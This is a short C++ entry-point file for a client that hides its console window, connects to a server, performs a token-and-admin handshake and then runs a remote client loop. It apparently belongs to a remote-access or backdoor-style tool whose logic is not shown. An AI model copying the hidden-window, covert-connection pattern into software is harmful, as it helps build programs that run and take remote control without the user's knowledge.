#include "../inc/Connexion.h"
#include "../inc/HandShake.h"



int main()
{
    ShowWindow(GetConsoleWindow(),SW_HIDE);

    Connexion Client; 
    HandShake Handshake;

    Client.openConnexion();

    Handshake.setSock(Client.getSocket());
    Handshake.beforeHandShake();
    Handshake.startHandShake(); 

    Client.setToken(Handshake.getToken());

    Client.main(Handshake.getIsAdmin(), Handshake.getPathProg());    
    Client.closeConnexion();
    
}
